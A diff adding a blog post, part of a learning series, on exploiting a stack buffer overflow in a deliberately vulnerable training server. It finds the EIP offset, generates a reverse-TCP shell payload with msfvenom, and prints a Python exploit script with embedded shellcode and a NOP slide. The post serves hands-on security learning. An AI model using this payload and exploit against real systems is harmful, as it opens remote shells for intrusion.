@@ -1,0 +1,90 @@
+I"e<h1 id="learning-binary-exploitation--3">Learning binary exploitation — 3</h1>
+
+<p>The vulnerable code I used in this blog:</p>
+
+<p><a href="https://github.com/dennis95stumm/Vulnerable-Server/blob/master/exploit_smart_server.py">Vulnerable-Server/exploit_smart_server.py at master · dennis95stumm/Vulnerable-Server</a></p>
+
+<h1 id="overflowing-the-buffer">Overflowing the buffer</h1>
+
+<p>First, I used gdb to figure out which function was responsible for checking the input we provide. Looks like checkAuth is the function I was looking for.</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*F5dh6MMRacJ7zyKm6G2uBA.png" alt="" /></p>
+
+<p>To observe the state of the registers and the stack, I created a breakpoint right after strcmp instruction in checkAuth function. Then I created a buffer of length 5000 hoping that it would be sufficient to overflow the buffer.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf-pattern\_create -l 5000
+</code></pre></div></div>
+<p><img src="https://miro.medium.com/max/1400/1*0zJTOJdqTde9Uvln8Z-3HA.png" alt="" />It was sufficient!</p>
+
+<p>Notice the address at the bottom, that’s the EIP. After obtaining the EIP, I tried to find the exact offset required to overflow the buffer.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf-pattern\_offset -l 5000 -q 0x63413962
+</code></pre></div></div>
+
+<ul>
+  <li><em>The offset was 58</em></li>
+</ul>
+
+<p>At this point I realized two things:</p>
+
+<ol>
+  <li>Even if I send a normal input after setting a breakpoint, the contents of <code class="language-plaintext highlighter-rouge">secret_buffer</code>, which holds the key to validating our input, is revealed.</li>
+  <li>If I had looked at the code of <code class="language-plaintext highlighter-rouge">checkAuth</code> function first, instead of being a skid and going straight into exploitation, I would’ve instantly found the key (secret_buffer) and noticed another variable <code class="language-plaintext highlighter-rouge">auth_flag</code> which determines if the program should move forward or not.</li>
+</ol>
+
+<p><img src="https://miro.medium.com/max/1400/1*IY4xTS7yPLyZsdKFLM_a3g.png" alt="" />LESSON LEARNED</p>
+
+<p>Anyway, what’s happening here is, when we overflow the buffer it actually overwrites the auth_flag too which is then returned by <code class="language-plaintext highlighter-rouge">checkAuth</code>function and is eventually checked if it’s true or not, so any value other than 0 will get us through.</p>
+
+<h1 id="shellcode-injection">Shellcode Injection</h1>
+
+<p>Now I could perfectly overwrite EIP with <code class="language-plaintext highlighter-rouge">python -c 'print "A"*58+"BBBB"'</code></p>
+
+<p><img src="https://miro.medium.com/max/1400/1*FTSIG8Ma_VkGKK-LcX98ZQ.png" alt="" />EIP Overwritten</p>
+
+<p>Now, I just had to find a unique address to inject the shellcode.</p>
+
+<p><strong><em>Note: Do</em></strong> <code class="language-plaintext highlighter-rouge">**unset env**</code> <strong><em>in gdb to remove any environment variables during the program run which may alter the memory addresses</em></strong></p>
+
+<p>Before finding a location for my shellcode, I had to generate one.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/shell\_reverse\_tcp -b "\\x00" LHOST=&lt;listening-ip&gt; LPORT=&lt;listening-port&gt; -f python -o reverse
+</code></pre></div></div>
+
+<p>Also, to make sure memory address don’t get messed up I used NOPs too. I struggled quite a bit to find a suitable memory address. Here’s how I did it:</p>
+
+<ol>
+  <li>I just used <code class="language-plaintext highlighter-rouge">print pad+nopslide+test_payload</code>to find the address where “\x43” starts</li>
+  <li>Then used that address in place of $eip, hoping that eip will point to the location of my shellcode (test_payload, in the previous step)</li>
+  <li>Now, I tested <code class="language-plaintext highlighter-rouge">print pad+eip+nopslide+test_payload</code> and this time I noticed “\x43” started from a different address, maybe the additional 4 bytes of $eip that I provided had somehow shifted the memory locations.</li>
+  <li>So, I used the address I found in (3) in eip and redirected the output of exploit.py into the program and got a shell</li>
+</ol>
+
+<p>P.S. I’m not sure if this is the right way to do this.</p>
+
+<p>Here’s the exploit script that I used:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import structpad = "A"\*58  
+eip = struct.pack("&lt;I", 0xffffd1b2)   
+buf =  b""  
+buf += b"\\xd9\\xee\\xba\\x44\\x2f\\xab\\x19\\xd9\\x74\\x24\\xf4\\x5f\\x31"  
+buf += b"\\xc9\\xb1\\x12\\x31\\x57\\x17\\x83\\xef\\xfc\\x03\\x13\\x3c\\x49"  
+buf += b"\\xec\\xaa\\x99\\x7a\\xec\\x9f\\x5e\\xd6\\x99\\x1d\\xe8\\x39\\xed"  
+buf += b"\\x47\\x27\\x39\\x9d\\xde\\x07\\x05\\x6f\\x60\\x2e\\x03\\x96\\x08"  
+buf += b"\\x71\\x5b\\x50\\xcd\\x19\\x9e\\xa1\\xee\\xf0\\x17\\x40\\x40\\x64"  
+buf += b"\\x78\\xd2\\xf3\\xda\\x7b\\x5d\\x12\\xd1\\xfc\\x0f\\xbc\\x84\\xd3"  
+buf += b"\\xdc\\x54\\x31\\x03\\x0c\\xc6\\xa8\\xd2\\xb1\\x54\\x78\\x6c\\xd4"  
+buf += b"\\xe8\\x75\\xa3\\x97"test\_payload = "C"\*95  
+nopslide = "\\x90"\*100print pad+eip+nopslide+buf
+</code></pre></div></div>
+
+<p>Of course, I could’ve just used sockets to make things easier, but I was feeling a bit adventurous ¯\_(ツ)_/¯</p>
+
+<p>So I sent this payload…</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*53krhS2u8gJArpYkst3KAg.png" alt="" /></p>
+
+<p>…and I got the shell!</p>
+
+<p>Thank you for reading.</p>
+:ET
